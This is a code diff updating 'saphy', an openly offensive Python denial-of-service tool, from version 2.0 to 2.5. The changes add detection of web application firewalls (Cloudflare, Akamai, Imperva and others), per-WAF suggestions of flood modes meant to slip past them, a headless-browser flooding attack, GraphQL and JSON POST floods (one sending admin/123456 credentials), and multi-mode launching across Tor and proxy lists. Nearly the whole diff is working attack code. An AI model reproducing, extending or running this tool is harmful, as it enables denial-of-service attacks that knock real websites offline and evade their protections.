@@ -1,4 +1,4 @@
-# saphy V2.0
+# saphy V2.5
 # Developed by: LYNSS
 import threading
 import asyncio
@@ -13,6 +13,9 @@ import requests
 import json
 import re
 import scapy
+import pyppeteer
+import tls_client
+from pyppeteer import launch
 from scapy.all import IP, TCP, UDP, ICMP, send
 from rich.console import Console
 from rich.live import Live
@@ -65,6 +68,19 @@ def get_connector(proxy, proxy_type):
         return ProxyConnector.from_url(f"socks5://{proxy}")
     else:
         return None
+    
+WAF_SIGNATURES = {
+    "cloudflare": ["cloudflare", "__cfduid", "__cf_bm"],
+    "sucuri": ["sucuri", "sucuri_cloudproxy_js"],
+    "akamai": ["akamai", "akamaiGHost", "akamai-bot"],
+    "imperva": ["incapsula", "x-iinfo", "visid_incap_"],
+    "f5": ["bigip", "x-waf", "x-cdn", "F5 Networks"],
+    "barracuda": ["barra_counter_session", "barracuda"],
+    "aws": ["awselb", "x-amzn", "AWSALB", "AWSALBCORS"],
+    "doseray": ["ray_id", "cf-ray"],
+    "bluedon": ["bd_sec_ver", "bluedon"],
+    "stackpath": ["stackpath", "sp_request_guid"]
+}
     
 
 # Initialize colorama
@@ -177,13 +193,17 @@ def analyze_target(url):
     }
     try:
         response = requests.get(url, timeout=10)
+        body = response.text
+        detected_wafs = detect_waf(response.headers, body)
+        info["waf"] = detected_wafs
         info["server"] = response.headers.get('Server', 'Unknown')
         info["powered_by"] = response.headers.get('X-Powered-By', 'Unknown')
         info["content_type"] = response.headers.get('Content-Type', 'Unknown')
         info["content_length"] = int(response.headers.get('Content-Length', 0) or 0)
         info["connection"] = response.headers.get('Connection', 'Unknown')
-        info["cloudflare"] = 'cloudflare' in (info["server"].lower() + info["powered_by"].lower())
+        info["cloudflare"] = 'cloudflare' in detected_wafs
 
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] WAF Detected  : {', '.join(detected_wafs) if detected_wafs else 'None'}") 
         print(f"{Fore.LIGHTMAGENTA_EX}[~] Status Code: {response.status_code}")
         print(f"{Fore.LIGHTMAGENTA_EX}[~] Server: {info['server']}")
         print(f"{Fore.LIGHTMAGENTA_EX}[~] X-Powered-By: {info['powered_by']}")
@@ -197,23 +217,69 @@ def analyze_target(url):
         print(f"{Fore.RED}[!] Target analysis failed: {e}\n")
     return info
 
+def detect_waf(headers, body):
+    detected = []
+    all_headers = ' '.join(f"{k}: {v}" for k, v in headers.items()).lower()
+    body_lower = body.lower() if isinstance(body, str) else ""
+
+    for waf, signatures in WAF_SIGNATURES.items():
+        for sig in signatures:
+            if sig.lower() in all_headers or sig.lower() in body_lower:
+                detected.append(waf.capitalize())
+                break
+
+    return list(set(detected))
+
 # Suggest attack modes
 def suggest_attack_modes(info):
     suggestions = []
+    content_type = info.get('content_type', '').lower()
+    connection = info.get('connection', '').lower()
+    wafs = info.get('waf', [])
 
-    if info.get('cloudflare'):
-        suggestions.append("random-method")
-    if 'html' in info.get('content_type', ''):
-        suggestions.append("http-flood")
-        suggestions.append("random-uri")
-    if 'json' in info.get('content_type', ''):
-        suggestions.append("post")
-    if 'keep-alive' in info.get('connection', '').lower():
-        suggestions.append("cookie")
+    # WAF-specific logic
+    for waf in wafs:
+        waf = waf.lower()
+        if waf == "cloudflare":
+            suggestions += ["random-method", "referer", "cookie", "headless"]
+        elif waf == "akamai":
+            suggestions += ["post", "cache-bypass"]
+        elif waf == "imperva":
+            suggestions += ["random-uri", "head", "useragent"]
+        elif waf == "sucuri":
+            suggestions += ["random-uri", "referer"]
+        elif waf == "aws":
+            suggestions += ["cookie", "useragent"]
+        elif waf == "f5":
+            suggestions += ["head", "cache-bypass"]
+        elif waf == "barracuda":
+            suggestions += ["post", "referer", "cache-bypass"]
+        elif waf == "stackpath":
+            suggestions += ["random-method", "referer"]
+
+    # Content-type based logic
+    if 'html' in content_type:
+        suggestions += ["http-flood", "random-uri"]
+    if 'json' in content_type:
+        suggestions += ["post"]
+    if 'keep-alive' in connection:
+        suggestions += ["cookie"]
     if info.get('content_length', 0) > 500000:
-        suggestions.append("cache-bypass")
+        suggestions += ["cache-bypass"]
+    if 'json' in content_type:
+        suggestions += ["json-post", "graphql"]
+    if 'aws' in [w.lower() for w in wafs] or 'akamai' in [w.lower() for w in wafs]:
+        suggestions += ["json-post", "graphql"]
 
-    return suggestions
+    # De-duplicate while preserving order
+    seen = set()
+    final_suggestions = []
+    for mode in suggestions:
+        if mode not in seen:
+            seen.add(mode)
+            final_suggestions.append(mode)
+
+    return final_suggestions
 
 # Global counters
 counters = {
@@ -240,6 +306,11 @@ def generate_headers(url, user_agents, mode="basic"):
         ])
     elif mode == "cache":
         headers["Cache-Control"] = "no-cache"
+    elif mode == "json":
+        headers["Content-Type"] = "application/json"
+    elif mode == "graphql":
+        headers["Content-Type"] = "application/json"
+        headers["X-GraphQL-Query"] = "enabled"
     return headers
 
 # Async attack
@@ -269,6 +340,36 @@ async def generic_attack(url, duration, user_agents, proxy, proxy_type, method="
                 with lock:
                     counters["total"] += 1
                     counters["error"] += 1
+
+async def headless_browser_attack(url, duration):
+    end_time = time.time() + duration
+    browser = await launch(
+        headless=True,
+        args=[
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-gpu',
+            '--window-size=1920,1080'
+        ]
+    )
+    page = await browser.newPage()
+
+    while time.time() < end_time:
+        try:
+            await page.setUserAgent(random.choice(load_user_agents()))
+            await page.goto(url, timeout=10000)
+            await asyncio.sleep(random.uniform(0.5, 2))  # simulate human delay
+
+            with lock:
+                counters["total"] += 1
+                counters["success"] += 1
+        except Exception as e:
+            with lock:
+                counters["total"] += 1
+                counters["error"] += 1
+
+    await browser.close()
 
 # Cloudflare bypass
 def cloudflare_bypass(url, duration, user_agents):
@@ -324,7 +425,7 @@ def stats_dashboard(url, duration):
         prev_total = total
 
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(f"{Fore.LIGHTYELLOW_EX}=== Saphy v2.0 - Attack Dashboard ==={Style.RESET_ALL}")
+        print(f"{Fore.LIGHTYELLOW_EX}=== Attack Dashboard ==={Style.RESET_ALL}")
         print(f"{Fore.LIGHTCYAN_EX}Target        : {url}")
         print(f"{Fore.LIGHTCYAN_EX}Time Left     : {int(end_time - time.time())}s")
         print(f"{Fore.LIGHTCYAN_EX}Total Requests: {total}")
@@ -501,7 +602,18 @@ async def main():
             "cookie": {"method": "GET", "header_mode": "cookie"},
             "referer": {"method": "GET", "header_mode": "referer"},
             "useragent": {"method": "GET"},
-            "cache-bypass": {"method": "GET", "header_mode": "cache", "uri_random": True}
+            "cache-bypass": {"method": "GET", "header_mode": "cache", "uri_random": True},
+            "headless": {"headless": True},
+            "graphql": {
+            "method": "POST",
+            "data": json.dumps({"query": "{__typename}"}),
+            "header_mode": "graphql"
+                },
+            "json-post": {
+                "method": "POST",
+                "data": json.dumps({"username": "admin", "password": "123456"}),
+                "header_mode": "json"
+            }
         }
 
         # Smart Suggestion
@@ -512,8 +624,15 @@ async def main():
             hint = f"[suggested]" if mode in suggested_modes else ""
             print(f"{Fore.YELLOW}{i}. {mode} {Fore.LIGHTMAGENTA_EX}{hint}")
 
-        mode_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > ")) - 1
-        selected_mode = list(attack_modes.keys())[mode_choice]
+        mode_choices = input(f"{Fore.LIGHTGREEN_EX}Enter choices (e.g. 1,3,5) > ")
+        selected_indices = [int(i.strip()) - 1 for i in mode_choices.split(',') if i.strip().isdigit()]
+        selected_modes = [list(attack_modes.keys())[i] for i in selected_indices if 0 <= i < len(attack_modes)]
+
+        if len(selected_modes) > 5:
+            print(f"{Fore.RED}[!] Too many modes selected. Max 5 allowed.")
+            return
+
+        print(f"{Fore.LIGHTCYAN_EX}Selected Modes : {', '.join(selected_modes)}\n")
 
         user_agents = load_user_agents()
         
@@ -530,12 +649,6 @@ async def main():
             proxy_list = ["127.0.0.1:9050"] * 50  
             selected_type = "socks5"
 
-        print(f"{Fore.LIGHTCYAN_EX}Proxies being used:")
-        for proxy in proxy_list[:500]:  
-            ip = proxy.split(":")[0]
-            location = geo_ip(ip)
-            print(f"{proxy} -> {location}")
-
         threading.Thread(target=stats_dashboard, args=(url, duration), daemon=True).start()
 
         if info['cloudflare']:
@@ -543,21 +656,42 @@ async def main():
             for t in threads_list: t.start()
             for t in threads_list: t.join()
         else:
-            config = attack_modes[selected_mode]
             tasks = []
-        for proxy in proxy_list:
-            tasks.append(generic_attack(
-                url=url,
-                duration=duration,
-                user_agents=user_agents,
-                proxy=proxy,
-                proxy_type=selected_type,
-                method=config.get("method", "GET"),
-                uri_random=config.get("uri_random", False),
-                data=config.get("data", None),
-                header_mode=config.get("header_mode", "basic"),
-                random_method=config.get("random_method", False)
-            ))
+
+        for selected_mode in selected_modes:
+            config = attack_modes[selected_mode]
+
+            if "headless" in config:
+                print(f"{Fore.LIGHTBLUE_EX}[i] Launching Headless Browser Attack...")
+                await headless_browser_attack(url, duration)
+                continue
+
+            if info['cloudflare']:
+                threads_list = [
+                    threading.Thread(target=cloudflare_bypass, args=(url, duration, user_agents), daemon=True)
+                    for _ in range(threads)
+                ]
+                for t in threads_list: t.start()
+                for t in threads_list: t.join()
+            elif "headless" in config:
+                await headless_browser_attack(url, duration)
+            else:
+                for proxy in proxy_list:
+                    tasks.append(generic_attack(
+                        url=url,
+                        duration=duration,
+                        user_agents=user_agents,
+                        proxy=proxy,
+                        proxy_type=selected_type,
+                        method=config.get("method", "GET"),
+                        uri_random=config.get("uri_random", False),
+                        data=config.get("data", None),
+                        header_mode=config.get("header_mode", "basic"),
+                        random_method=config.get("random_method", False)
+                    ))
+            await asyncio.gather(*tasks)
+
+        print(f"{Fore.YELLOW}[i] Launching {len(tasks)} attack tasks across {len(proxy_list)} proxies and {len(selected_modes)} mode(s).")
 
         await asyncio.gather(*tasks)
 
@@ -618,6 +752,6 @@ async def main():
         else:
             print(f"{Fore.RED}[!] Invalid choice!")
 
-
+# Run Main
 if __name__ == "__main__":
     asyncio.run(main())
